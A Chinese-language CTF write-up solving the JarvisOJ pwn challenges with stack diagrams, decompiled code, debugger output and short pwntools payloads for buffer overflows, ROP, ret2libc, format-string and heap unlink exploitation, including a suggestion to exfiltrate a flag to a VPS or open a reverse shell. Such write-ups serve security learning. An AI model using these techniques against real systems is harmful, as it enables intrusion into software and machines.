# JarvisOJ All Pwn Writeup

阅读量 **409792**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-22 10:00:24

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01c904dc1ca90ac8fc.png)

## JarvisOJ-all-pwn-Writeup

解决了 [_jarvisOJ_](https://www.jarvisoj.com/login) 至今 （2018.9.19）的所有 pwn 题目，分享一下
writeup。做题目的过程中参考了很多师傅的 writeup，在 Reference 中贴出了师傅们的博客，感谢师傅们的分享。

题目较多，对于网上有较多 writeup 的题目，不再详细分析，只列出思路；着重分析 writeup 较少的题目。

## [XMAN]level0 (50)

最简单的栈溢出，给了能直接拿 shell 的函数，覆盖返回地址为该函数地址即可

    
    
    +----------+
    |........  |
    |padding   |
    |........  |
    |          |
    +----------+
    |padding   |  <- rbp
    +----------+
    |callsystem|  <- ret addr
    +----------+
    
    
    payload = '0' * (0x80 + 0x8) + p64(ELF("./level0").sym['callsystem'])

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level0/solve.py)

## Tell Me Something (100)

与上一题几乎完全一样，不再分析

    
    
    payload = '0' * (0x80 + 0x8) + p64(ELF("./guestbook").sym['good_game'])

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Tell_Me_Something/solve.py)

## [XMAN]level1 (100)

有栈溢出漏洞，没有开 NX 保护，因此可以用 shellcode

    
    
    +----------+              
    |shellcode |  <-----------+
    |shellcode |              |
    |........  |              |
    |junk data |              |
    |........  |              |
    |          |              |
    +----------+              |
    |junk data |  <- ebp      |
    +----------+              |
    |buf addr  |  <- ret add -+
    +----------+
    
    
    payload = asm(shellcraft.sh()).ljust(0x88 + 0x4, '\0') + p32(buf_addr)

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level1/solve.py)

## [XMAN]level2 (150)

存在栈溢出，程序中有 **system** 函数 和 **/bin/sh** 字符串，根据函数调用约定，32
位程序函数的参数是放在栈上的，因此可以通过伪造一个调用 **system(“/bin/sh”)** 的栈结构来 get shell

    
    
    +---------------+
    |padding        |
    |.......        |
    |               |
    |               |
    |               |
    +---------------+
    |padding        | <- ebp
    +---------------+
    |system addr    | <- ret addr
    +---------------+ 
    |junk data      | <- system ret
    +---------------+
    |/bin/sh addr   | 
    +---------------+
    
    
    payload = flat(cyclic(0x88 + 4), elf.sym['system'], 'aaaa', next(elf.search("/bin/sh")))
    # 此时程序运行流程为 vulnerable_function -> system("/bin/sh") -> junk data，因为我们已经执行了 system("/bin/sh")，因此 system("/bin/sh") 的返回地址（即 junk data 可以随便指定）

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2/solve.py)

## Typo (150)

这道题目特殊在程序是 arm 架构的，但其实只是一个简单的 rop，把环境搭建好后并不难。

我在另一篇博文中以这道题目为例分析了 arm 的 pwn，包括了运行和调试的环境搭建，以及恢复符号，[
_链接_](http://m4x.fun/post/arm_pwn/)。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_typo/solve.py)

## [XMAN]level2_x64 (200)

与 level2 相比思路基本一致，不同的是这道题目是 64 位的，64 位与 32 位的传参规则不同，需要用到 rop 控制寄存器，网上有很多分析 rop
的文章，这里就不介绍了。

    
    
    +--------------+
    |padding       |
    |......        |
    |              |
    |              |
    |              |
    +--------------+
    |padding       | <- rbp
    +--------------+
    |prdi addr     | <- ret addr
    +--------------+
    |/bin/sh addr  |
    +--------------+
    |system addr   |
    +--------------+
    
    
    payload = flat(cyclic(0x88), prdi, next(elf.search("/bin/sh")), elf.sym['system'])

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2_x64/solve.py)

## [XMAN]level3 (200)

标准的 ret2libc，先通过 rop 控制 puts 出某个 GOT 中的地址以找到 libc 的基址（elf
的延迟绑定网上也有很多分析的文章，这里也不介绍了），有了 libc 的基地址后，libc 中的所有函数和字符串的地址就知道了，构造一个
**system(“/bin/sh”)** 的函数调用栈即可

    
    
    +-----------+
    |padding    |
    |......     |
    |           |
    |           |
    +-----------+
    |padding    |  <- ebp
    +-----------+
    |write@plt  |  <- ret addr
    +-----------+
    |_start addr|  # write(1, write@got, 4) -> _start
    +-----------+
    |1          |
    +-----------+
    |write@got  |
    +-----------+
    |4          |
    +-----------+
    
    +-----------+
    |padding    |
    |......     |
    |           |
    +-----------+
    |padding    |  <- ebp
    +-----------+
    |system     |  <- ret addr
    +-----------+-    |junk data  |  # system("/bin/sh") -> junk data
    +-----------+
    |/bin/sh addr
    +-----------+
    
    
    leak = flat(cyclic(0x88 + 4), elf.plt['write'], elf.sym['_start'], 1, elf.got['write'], 4)
    rop = flat(cyclic(0x88 + 4), libc.sym['system'], 'aaaa', next(libc.search("/bin/sh")))

新手容易犯的一个错误是本地和远程的 libc 混用，不同版本的 libc 函数的偏移一般不同，所以本地测试和远程需要使用对应的 libc，本地调试时可以通过
LD_PRELOAD=./libc_path ./binary 来指定 libc（版本相差过大时可能会出错）

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level3/solve.py)

## Smashes (200)

ssp 攻击，大致原理是覆盖 __libc_argv[0]，触发栈溢出，通过报错来 leak 某些信息。[
_veritas501_](https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/)
师傅对这种方法做过很优秀的分析。

通过调试可以快速确定覆盖所需的偏移量以及重映射后 flag 的地址

    
    
    pwndbg> stack 50
    00:0000│ rax rsp rdi-1  0x7fffffffddd0 ◂— 0x31313131313131 /* u'1111111' */
    01:0008│                0x7fffffffddd8 ◂— 0x0
    ... ↓
    15:00a8│                0x7fffffffde78 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    16:00b0│                0x7fffffffde80 ◂— 0x0
    17:00b8│                0x7fffffffde88 —▸ 0x7ffff7a99b82 (_IO_default_setbuf+66) ◂— cmp    eax, -1
    18:00c0│                0x7fffffffde90 ◂— 0x0
    19:00c8│                0x7fffffffde98 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    1a:00d0│                0x7fffffffdea0 ◂— 0x0
    ... ↓
    1c:00e0│                0x7fffffffdeb0 —▸ 0x7ffff7dcf2a0 (_IO_file_jumps) ◂— 0x0
    1d:00e8│                0x7fffffffdeb8 —▸ 0x7ffff7a966f9 (_IO_file_setbuf+9) ◂— test   rax, rax
    1e:00f0│                0x7fffffffdec0 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    1f:00f8│                0x7fffffffdec8 —▸ 0x7ffff7a8dc37 (setbuffer+231) ◂— test   dword ptr [rbx], 0x8000
    20:0100│                0x7fffffffded0 —▸ 0x7ffff7de70e0 (_dl_fini) ◂— push   rbp
    21:0108│                0x7fffffffded8 ◂— 0xe2daa1a4cd530600
    22:0110│                0x7fffffffdee0 —▸ 0x4008b0 ◂— push   r15
    23:0118│                0x7fffffffdee8 ◂— 0x0
    24:0120│                0x7fffffffdef0 —▸ 0x4008b0 ◂— push   r15
    25:0128│                0x7fffffffdef8 —▸ 0x4006e7 ◂— xor    eax, eax
    26:0130│                0x7fffffffdf00 ◂— 0x0
    27:0138│                0x7fffffffdf08 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
    28:0140│                0x7fffffffdf10 ◂— 0x0
    29:0148│                0x7fffffffdf18 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe312 ◂— 0x346d2f656d6f682f ('/home/m4')
    2a:0150│                0x7fffffffdf20 ◂— 0x100000000
    2b:0158│                0x7fffffffdf28 —▸ 0x4006d0 ◂— sub    rsp, 8
    2c:0160│                0x7fffffffdf30 ◂— 0x0
    2d:0168│                0x7fffffffdf38 ◂— 0xeab3e86e873f94c
    2e:0170│                0x7fffffffdf40 —▸ 0x4006ee ◂— xor    ebp, ebp
    2f:0178│                0x7fffffffdf48 —▸ 0x7fffffffdfe0 ◂— 0x1
    30:0180│                0x7fffffffdf50 ◂— 0x0
    ... ↓
    pwndbg> distance 0x7fffffffdfe8 0x7fffffffddd0
    0x7fffffffdfe8->0x7fffffffddd0 is -0x218 bytes (-0x43 words)
    pwndbg> search CTF{
    smashes         0x400d21 push   r12
    smashes         0x600d21 0x657265487b465443 ('CTF{Here')
    warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2e83, halting search.
    pwndbg> 

因此可以构造如下的 payload

    
    
    payload = flat(cyclic(0x218), 0x400d21)

或者可以用一种更暴力的方法，不计算偏移量，直接用 flag 地址暴力覆盖过去

    
    
    payload = p64(0x400d21) * 100

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Smashes/solve.py)

## [61dctf]fm (200)

格式化字符串漏洞的入门题目，格式化字符串漏洞的原理也可以找到很多分析，这里不说了。这道题目中只需要修改一个全局变量的值为 4 即可

    
    
    payload = p32(ELF("./fm").sym['x']) + "%11$n"
    # 或者使用 fmtstr_payload()
    payload = fmtstr_payload(11, {ELF("./fm").sym['x']: 4})

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_fm/solve.py)

## Backdoor (200)

一个 windows 的题目，其实更像一个逆向题目。

在 sub_401000 函数中存在栈溢出

    
    
    int __cdecl sub_401000(char *Source)
    {
      char Dest[31]; // [esp+4Ch] [ebp-20h]
    
      strcpy(Dest, "0");
      *(_DWORD *)&Dest[2] = 0;
      *(_DWORD *)&Dest[6] = 0;
      *(_DWORD *)&Dest[10] = 0;
      *(_DWORD *)&Dest[14] = 0;
      *(_DWORD *)&Dest[18] = 0;
      *(_DWORD *)&Dest[22] = 0;
      *(_DWORD *)&Dest[26] = 0;
      *(_WORD *)&Dest[30] = 0;
      strcpy(Dest, Source);                         // overflow
      return 0;
    }

Source 是由 argv[1] 以及程序中的 xor，qmemcpy 等操作共同决定的。看一下进行了哪些操作

    
    
    signed int __cdecl wmain(int argc, char **argv)
    {
      char v3[145]; // [esp+50h] [ebp-2C8h]
      char v4; // [esp+E1h] [ebp-237h]
      char v5[28]; // [esp+E4h] [ebp-234h]
      char Source[5]; // [esp+100h] [ebp-218h]
      __int16 i; // [esp+108h] [ebp-210h]
      char Dest[512]; // [esp+10Ch] [ebp-20Ch]
      __int16 offset; // [esp+30Ch] [ebp-Ch]
      LPSTR lpMultiByteStr; // [esp+310h] [ebp-8h]
      int cbMultiByte; // [esp+314h] [ebp-4h]
    
      cbMultiByte = WideCharToMultiByte(1u, 0, (LPCWSTR)argv[1], -1, 0, 0, 0, 0);
      lpMultiByteStr = (LPSTR)sub_4011F0(cbMultiByte);
      WideCharToMultiByte(1u, 0, (LPCWSTR)argv[1], -1, lpMultiByteStr, cbMultiByte, 0, 0);
      offset = *(_WORD *)lpMultiByteStr; // offset = argv[1]
      if ( offset < 0 )
        return -1;
      offset ^= 0x6443u;
      strcpy(Dest, "0");
      memset(&Dest[2], 0, 0x1FEu);
      for ( i = 0; i < offset; ++i )
        Dest[i] = 'A';
      *(_DWORD *)Source = 0x7FFA4512;               // jmp esp
      Source[4] = 0;
      strcpy(&Dest[offset], Source);
      qmemcpy(v5, nops, 0x1Au);
      strcpy(&Dest[offset + 4], v5);
      qmemcpy(v3, &shellcode, sizeof(v3));
      v4 = 0;
      strcpy(&Dest[offset + 29], v3);
      sub_401000(Dest);
      return 0;
    }

大致的处理流程是用户传给程序的参数 (argv[1]) 亦或 0x6443 后作为一个偏移量，然后 jmp esp，nops，shellcode 等依次
copy 到 Dest[offset] 上，最后在 **sub_401000()** 里触出栈溢出(本来不知道 0x7FFA4512
是什么，搜了一下才发现这是 windows 下的一个 [_万能 jmp
esp_](https://blog.csdn.net/gxustudent/article/details/6624530))

看一下 **sub_401000()** 的栈结构，控制 jmp esp 为返回地址即可触发后门，也即是 **offset ^ 0x6443 == 0x20
+ 4** 即可

    
    
    -00000020 Dest            db 31 dup(?)
    -00000001                 db ? ; undefined
    +00000000  s              db 4 dup(?)
    +00000004  r              db 4 dup(?)
    +00000008 Source          dd ?

因此可以得到该参数和 flag

    
    
    jarvisOJ_Backdoor [master●●●] cat solve.py 
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from hashlib import sha256
    from libnum import n2s
    
    key = 0x20 + 4
    key ^= 0x6443
    print key
    key = hex(key)[2: ]
    
    print "PCTF{%s}" % (sha256(key.decode('hex')[::-1]).hexdigest())

## [XMAN]level3(x64) (250)

与 level3 相比，只在函数传参上有区别，按照 x64 的函数调用约定 leak 出 libc，然后 rop 执行 system(“/bin/sh”)
即可。

值得注意的是，这道题目中没有 puts，因此 leak libc 只能通过 write(1, elf.got[‘write’], 8)，但
ROPgadget 等工具只能找到控制 rdi 和 rsi 的 gadget，也就是我们不能控制 write 输出的长度，这时候有两种方法：

一是使用 64 位 elf 的 [_通用 gadget_](https://www.cnblogs.com/Ox9A82/p/5487725.html)；

二是通过调试发现 write 时 rdx 是大于 8 的（实际上大于 6 即可），因此可以完全不用考虑控制 rdx。

[_exploit
here_](https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_level3_x64)

## [XMAN]level4 (250)

这道题目与 level3 相比没有提供 libc，因此就不能通过 leak libc 的方式来找 system 和 /bin/sh
的地址了。pwntools 中有个很有用的函数
[_DynELF_](http://docs.pwntools.com/en/stable/dynelf.html?highlight=DynELF#module-pwnlib.dynelf)，可以在能控制 leak 内容的情况下leak 出某些函数的地址（如 system）。

和 level3 相似，这道题目可以构造 rop leak 出某些地址上的内容后返回到 _start，因此可以通过 DynELF 来 leak 出
system 的地址，再读入 /bin/sh\0 字符串既可以构造 rop 调用 system(“/bin/sh”)

> DynELF 的原理可以看沐师傅的一篇 [_分析_](http://muhe.live/2016/12/24/what-DynELF-does-> basically/)

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level4/solve.py)

## Test Your Memory (300)

这道题目分数给高了，难度大概只是和 level2 相当，构造 rop chain 直接调用 system(“cat flag”)
即可，唯一需要注意的是程序最后有一个 strncmp，需要保证此时 strncmp 比较的两个两个地址都是可读的

    
    
      if ( !strncmp(s, s2, 4u) )
        puts("good job!!\n");
      else
        puts("cff flag is failed!!\n");
    
    
    +-----------+
    |padding    |
    |......     |
    |           |
    +-----------+
    |padding    | <- ebp
    +-----------+
    |win_func   | <- ret addr
    +-----------+-    |readable   | <- mem_test 函数的参数，即 strncmp 比较的对象，需要保证该地址是可读的
    +-----------+
    |catflag    |
    +-----------+

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Test_Your_Memory/solve.py)

## [XMAN]level5 (300)

题目假设禁用了 system 和 execve，并提示使用 mprotect 或者 mmap。先看一下这两个函数是什么作用，查看这两个函数的 man 手册

    
    
    NAME
           mprotect — set protection of memory mapping
    
    SYNOPSIS
           #include <sys/mman.h>
    
           int mprotect(void *addr, size_t len, int prot);
    
    DESCRIPTION
           The mprotect() function shall change the access protections to be  that  speci‐
           fied  by prot for those whole pages containing any part of the address space of
           the process starting at address addr and continuing for len bytes. The  parame‐
           ter  prot  determines  whether  read,  write,  execute,  or some combination of
           accesses are permitted to the data being mapped. The prot  argument  should  be
           either  PROT_NONE  or  the  bitwise-inclusive  OR  of one or more of PROT_READ,
           PROT_WRITE, and PROT_EXEC.
    
    
    NAME
           mmap — map pages of memory
    
    SYNOPSIS
           #include <sys/mman.h>
    
           void *mmap(void *addr, size_t len, int prot, int flags,
               int fildes, off_t off);
    
    DESCRIPTION
           The mmap() function shall establish a mapping between an  address  space  of  a
           process and a memory object.

mprotect 函数用于改变某段地址的权限（rwxp），mmap 用于申请一段空间，根据参数不同可以设置这段空间的权限。

这道题目开启了 NX 保护，并假设禁用了 system 和 execve 函数（实际并没有），因此可以考虑通过 mprotect 改变 .bss/.data
权限或者通过 mmap 申请一段具有可执行权限的空间写 shellcode 的方法来 get shell，重点介绍如何使用 mprotect。

  1. 第一次 rop 使用 **write(1, elf.got[‘write’], rdx)** leak 出 libc 基地址
  2. 第二次 rop 使用 **mprotect(0x00600000, 0x1000, 7)** 把 .bss 段设为有可执行权限
  3. 第三次 rop 通过 **read(0, elf.bss() + 0x500, 0x100)** 把 shellcode 读到 .bss 并返回到 shellcode

需要注意的是第一次 rop 时，与 level3 相似，调试可以发现 rdx 是大于 6的，因此可以不用通用 gadget 来设置 rdx；

但第二次使用 mprotect 时必须设置 rdx 寄存器，这时候我们已经 leak 除了 libc 基地址，因此可以 **使用** **libc**
**中的 gadget** **来设置 rdx** ，也不需要用通用 gadget。

并且 **mprotect** **指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍** 。

也想过使用 mmap 来申请一段内存，但 mmap 需要控制 6 个寄存器，找了半天没有找到太好的 gadget，就没有再继续尝试了，如果有大佬能使用
mmap 来申请空间请务必指教。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level5/exp_mprotect.py)

## Add (300)

一道 mips 的题目，环境的搭建同样可以参考我之前写过的一篇 [_分析_](http://m4x.fun/post/arm_pwn/)。而IDA 的
hexray 对 mips 没有太好的支持，可以使用 [_jeb-mips_](https://www.pnfsoftware.com/jeb/mips)
或者 [_retdec_](https://github.com/avast-tl/retdec)
来反编译，但实际效果也只是能看，最准确的方法还是直接读汇编。

先看输入的部分，输入遇到 \n 才会停止，因此存在栈溢出

![](https://p3.ssl.qhimg.com/t01ffde74e6d8bf69d5.png)

同时程序中有一处打印栈上输入地址的

    
    
    loc_400B5C:
    la      $t9, printf
    la      $a0, aYourInputWasP  # "Your input was %p\n"
    jalr    $t9 ; printf
    move    $a1, input
    lw      $gp, 0x98+var_88($sp)
    move    $v1, input
    b       loc_400984
    li      $s2, 0x80

跳转过来的条件是 strcmp(input, s4) 相等

    
    
    la      $t9, strcmp
    move    $a0, input       # s1
    jalr    $t9 ; strcmp
    move    $a1, $s4         # s2
    lw      $gp, 0x98+var_88($sp)
    beqz    $v0, loc_400B5C
    move    $a0, input       # s

再向上找 s4 是什么

    
    
    la      $t9, srand
    move    $at, $at
    jalr    $t9 ; srand
    li      $a0, 0x123456    # seed
    lw      $gp, 0x98+var_88($sp)  # srand(0x123456)
    addiu   $s4, $sp, 0x98+challenge
    la      $t9, rand
    move    $at, $at
    jalr    $t9 ; rand
    addiu   input, $sp, 0x98+buf
    lw      $gp, 0x98+var_88($sp)
    lui     $a1, 0x40
    la      $t9, sprintf
    la      $a1, aD          # "%d"
    move    $a2, $v0
    jalr    $t9 ; sprintf    # sprintf(s4, "%d", rand())
    move    $a0, $s4         # s

大致流程是

    
    
    srand(0x123456);
    int tmp = rand();
    sprintf(s4, "%d", tmp);

随机种子是固定的，也即是随机值固定，因此 s4 的值也就知道了，通过这个功能我们能得到栈上输入的地址，程序没有开 NX 保护，输入
shellcode，并返回到 shellcode 即可。

通过调试可以快速确定覆盖返回地址所需的偏移量。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_add/solve.py)

## [61dctf]calc.exe (300)

这道题没开 NX 保护，很大概率就是使用 shellcode 来 get shell 了。这个题目主要麻烦在代码量太大，还是 strip 后的
binary，看起来很是费力。

但这种代码量大的题目一般漏洞都很明显（代码量又大漏洞又难找，那题还怎么做），仔细分析，程序中存在一个如下的结构体（不是完全正确，程序没有看完）

    
    
    struct NODE
    {
    	char *name;
    	char *type;
    	void (*method)();
    	int len;
    }

所有的变量和函数以这种结构体的形式存储，其中有一个很敏感的函数指针，如果能控制函数指针，就能控制 eip 了。

再往下看，程序有一个 var 可以声明变量，命令格式为 var variable = “value”

    
    
        if ( !strcmp(s1, "var") )
        {
          argv1 = strtok(0, " ");
          argv2 = strtok(0, " ");
          if ( !argv2 )
            break;
          if ( argv2 && *argv2 == '=' )
          {
            argv3 = strtok(0, " ");
            if ( !argv3 )
            {
              puts("invalid syntax");
              break;
            }
            if ( *argv3 == '"' )
            {
              nptra = argv3 + 1;
              v26 = strchr(nptra, '"');
              if ( v26 )
              {
                *v26 = 0;
                v3 = set_str(argv1, nptra);
                store_into_list(g_list, argv1, (int)v3);
              }
            }

但 store_into_list() 函数寻址时是通过变量名之间的比较进行的，也即是即使 var add = “eval”
也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的 method 改成 shellcode 即可。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_calc.exe/solve.py)

## Guess (300)

这个题目也更像一个逆向题，好在程序没有 strip，看起来比较清楚。

程序先建立了一个 socket，之后的输入输出均通过该 socket 进行。主要逻辑在 is_flag_correct 函数中，而漏洞也出在这里。

    
    
        value1 = bin_by_hex[flag_hex[2 * i]];
        value2 = bin_by_hex[flag_hex[2 * i + 1]];

这里使用了下标寻址的方法，flag_hex 是我们的输入，类型是 char *，通过构造负数就可以寻址到 bin_by_hex 上方

    
    
    -0000000000000198 flag_hex        dq ?                    ; offset
    -0000000000000190 given_flag      db 50 dup(?)
    -000000000000015E                 db ? ; undefined
    -000000000000015D                 db ? ; undefined
    -000000000000015C                 db ? ; undefined
    -000000000000015B                 db ? ; undefined
    -000000000000015A                 db ? ; undefined
    -0000000000000159                 db ? ; undefined
    -0000000000000158                 db ? ; undefined
    -0000000000000157                 db ? ; undefined
    -0000000000000156                 db ? ; undefined
    -0000000000000155                 db ? ; undefined
    -0000000000000154                 db ? ; undefined
    -0000000000000153                 db ? ; undefined
    -0000000000000152                 db ? ; undefined
    -0000000000000151                 db ? ; undefined
    -0000000000000150 flag            db 50 dup(?)
    -000000000000011E                 db ? ; undefined
    -000000000000011D                 db ? ; undefined
    -000000000000011C                 db ? ; undefined
    -000000000000011B                 db ? ; undefined
    -000000000000011A                 db ? ; undefined
    -0000000000000119                 db ? ; undefined
    -0000000000000118                 db ? ; undefined
    -0000000000000117                 db ? ; undefined
    -0000000000000116                 db ? ; undefined
    -0000000000000115                 db ? ; undefined
    -0000000000000114                 db ? ; undefined
    -0000000000000113                 db ? ; undefined
    -0000000000000112                 db ? ; undefined
    -0000000000000111                 db ? ; undefined
    -0000000000000110 bin_by_hex      db 256 dup(?)
    -0000000000000010                 db ? ; undefined

而 flag 就在 bin_by_hex 上方，这样如果我们构造 value1 = 0, value2 = flag[i]，就可以覆盖 flag[i]
了，这样就可以通过逐位覆盖 flag，根据不同的回显来爆破了。

王一航师傅对这道题目做过很详细的分析，[ _传送门_](https://www.jianshu.com/p/40f846d14450)

## HTTP (350)

这道题目也更像一个逆向，没有 pwn 常见的溢出等漏洞，而是直接可以命令执行

    
    
    __int64 __fastcall sub_40102F(const char *a1, char *a2, int a3)
    {
      char *v3; // rbx
      int v5; // [rsp+Ch] [rbp-34h]
      FILE *stream; // [rsp+20h] [rbp-20h]
      int i; // [rsp+2Ch] [rbp-14h]
    
      v5 = a3;
      stream = popen(a1, "r");                      // rce
      if ( stream )
      {
        for ( i = 0; ; ++i )
        {
          v3 = &a2[i];
          *v3 = fgetc(stream);
          if ( *v3 == -1 || v5 - 1 <= i )
            break;
        }
        pclose(stream);
      }
      else
      {
        i = sprintf(a2, "error command line:%s \n", a1);
      }
      a2[i] = 0;
      return (unsigned int)i;
    }

当然到这一步需要通过前边的各种验证

    
    
    signed __int64 __fastcall sub_400FAF(__int64 a1)
    {
      int v2; // [rsp+1Ch] [rbp-14h]
      const char *s; // [rsp+20h] [rbp-10h]
      int i; // [rsp+2Ch] [rbp-4h]
    
      s = encrypt(off_601CE8);
      v2 = strlen(s);
      for ( i = 0; i < v2; ++i )
      {
        if ( (i ^ *(char *)(i + a1)) != s[i] )
          return 0LL;
      }
      return 1LL;
    }

encrypt 函数逆到一半发现都是固定值，直接可以把结果调试出来。按照题目的要求构造报文格式，就可以任意命令执行了。

但关键是执行什么命令，这道题目是通过 socket 进行通信的，因此直接 cat flag 不会有回显，可以通过管道将结果发送到远程 vps 上，在 vps
上监听到 flag，或者可以直接建立一个 reverse shell。

原理可以看我写的几篇分析 [_fd_](http://m4x.fun/post/play_with_file_descriptor_1/) 的文章。

[_expoit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_HTTP/solve.py)

## Guestbook2 (400)

Guessbook2，[XMAN]level6，[XMAN]level6_x64 三道题目几乎一样，放到一块讲。

程序中存在如下的结构体

    
    
    struct noteList
    {
    	int all;
    	int now;
    	struct NOTE notes[256];
    }
    
    struct NOTE
    {
    	int inuse;
    	int len;
    	char *content;
    }

在 delete 函数中存在漏洞

    
    
    void delPost()
    {
      int idx; // [rsp+Ch] [rbp-4h]
    
      if ( POSTS->now <= 0 )
      {
        puts("No posts yet.");
      }
      else
      {
        printf("Post number: ");
        idx = getInt();
        if ( idx >= 0 && idx < POSTS->all )         // 2free
        {
          --POSTS->now;
          POSTS->block[idx].inuse = 0LL;
          POSTS->block[idx].len = 0LL;
          free(POSTS->block[idx].content);          // uaf
          puts("Done.");
        }
        else
        {
          puts("Invalid number!");
        }
      }
    }

在 add 和 edit 函数中，新申请的堆块是经过 0x80 对其的，即只能申请 0x80，0x100,0x180 … 这样的堆块。

可以有如下的思路：

  4. 先 leak 堆的地址
  5. 根据 leak 出的堆的地址进行 unlink
  6. unlink 后把 chunk_list 中的某一项改成 got（如atoi@got)，这样 show 就可以 leak libc，edit 就可以 hijack got
  7. 把 atoi@got 改成 system，然后发送 $0\0，sh\0 或 /bin/sh\0 即可 get shell

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Guestbook2/exp.py)

## [XMAN]level6 (350)

同上，只不过是 32 位的

## [XMAN]level6_x64 (400)

同上

## [61dctf]hsys (400)

这个程序也很大，要耐心看。 程序中存在如下的结构体

    
    
    struct HACKER
    {
    	int id;
    	char name[40];
    	char *something;
    	int gender;
    	int age;
    }

程序给了 list, add, show, info, gender 和 exit 几个功能，通过看代码发现还有一个 del 的隐藏功能，只有 id 为 0
，即为 admin 的时候才能触发。

    
    
          if ( !strcmp(command, "del") )
          {
            if ( IDX )
            {
              v26 = printf("You must be the system administrator to use del command\n");
            }
            else if ( args && strlen(args) )
            {
              if ( delete(args) == -1 )
              {
                v16 = args;
                v23 = printf("hacker `%s` not found in system\n", args);
              }
              else
              {
                v16 = args;
                v14 = printf("hacker `%s` deleted from system\n", args);
                IDX = -1;
                v24 = v14;
              }
            }
            else
            {
              v25 = printf("usage: del <hacker name>\n");
            }
          }

再看 add 的功能，算法渣表示楞了很久才反应过来到这是一个 hash 表 orz。

    
    
    int __cdecl getIndex(const char *a1)
    {
      struct HACKER *v1; // ST18_4
      int v3; // [esp+1Ch] [ebp-1Ch]
      signed int i; // [esp+20h] [ebp-18h]
      unsigned int v5; // [esp+24h] [ebp-14h]
      size_t len; // [esp+28h] [ebp-10h]
    
      len = strlen(a1);
      if ( len >= 0x28 )
        return -1;
      v5 = getIdxByName(a1);
      v3 = v5;
      for ( i = 0; i < 1338; ++i )
      {
        v3 = (v5 + i) % 1337;
        if ( !ptr[v3] )
          break;
        if ( !strcmp(ptr[(v5 + i) % 1337]->name, a1) )
          return (v5 + i) % 1337;
      }
      v1 = malloc(0x38u);
      v1->id = v3;
      memcpy(v1->name, a1, len);                    // leakable
      v1->name[39] = 0;
      v1->something = 0;
      ptr[v3] = v1;
      return v3;
    }

其中 memcpy 不会在末尾加上 \0，因此是可以 leak 的，可以利用这个来 leak libc

打个小广告，找 main_arena 在 libc 中的偏移可以用我写的这个
[_小工具_](https://github.com/bash-c/main_arena_offset#install)

    
    
    jarvisOJ_hsys [master●●] main_arena ./libc-2.19.so 
    [+]__malloc_hook_offset : 0x1ab408
    [+]main_arena_offset : 0x1ab420

继续看其他函数，发现在 show 中有一个 很可疑的memcpy，有可能造成栈溢出

    
    
       else if ( !strcmp(command, "show") )
        {
          if ( IDX >= 0 )
          {
            format = "%d: Name: %s, Age %d, Gender: %s, Info: ";
            v42 = 128;
            v41 = "Male";
            v40 = "Female";
            s = &s;
            v38 = 0;
            memset(&s, 0, 0x80u);
            Name = ptr[IDX]->name;
            Age = ptr[IDX]->age;
            Gender = v41;
            if ( !LOBYTE(ptr[IDX]->gender) )
              Gender = v40;
            v17 = IDX;
            v37 = sprintf(s, format, IDX, Name, Age, Gender);
            v36 = cntIdx(IDX) + 8;
            if ( IDX )
            {
              v15 = ptr[IDX]->name;
              name_len = strlen(v15);
            }
            else
            {
              name_len = 5;                         // admin
            }
            v15 = ptr[IDX]->age;
            v34 = name_len + v36 + 6;
            v7 = cntIdx(v15);
            v8 = 4;
            if ( !LOBYTE(ptr[IDX]->gender) )
              v8 = 6;
            v63 = v8 + v7 + v34 + 10 + 8;
            n = 127 - v63;
            if ( ptr[IDX]->something )
            {
              v15 = ptr[IDX]->something;
              v10 = strlen(v15);
              if ( v10 > n )
              {
                s = &s;
                v13 = strlen(&s);
                memcpy(&s[v13], ptr[IDX]->something, n);	// overflow
                v72 = 46;
                v73 = 46;
                v74 = 46;
              }
              else
              {
                s = &s;
                v11 = strlen(&s);
                v15 = ptr[IDX]->something;
                v30 = &s[v11];
                v29 = v15;
                v12 = strlen(v15);
                memcpy(v30, v29, v12);
              }
            }
            else
            {
              s = &s;
              v9 = strlen(&s);
              v32 = strcpy(&s[v9], "N/A");
            }
            v27 = puts(&s);
          }
          else
          {
            v44 = printf("You must add a hacker first and then show information about him/her\n");
          }
        }  

为什么会觉得 memcpy 可疑？

  * 像之前说的，这种代码多的题目一般不会有很难找的漏洞，因此我着重看了 strcpy，memcpy 等危险函数，发现 memcpy 的长度在一定条件下是可以控制的

这样如果能控制 memcpy 的长度，就可以直接栈溢出来 rop 或者用 one_gadget 了。

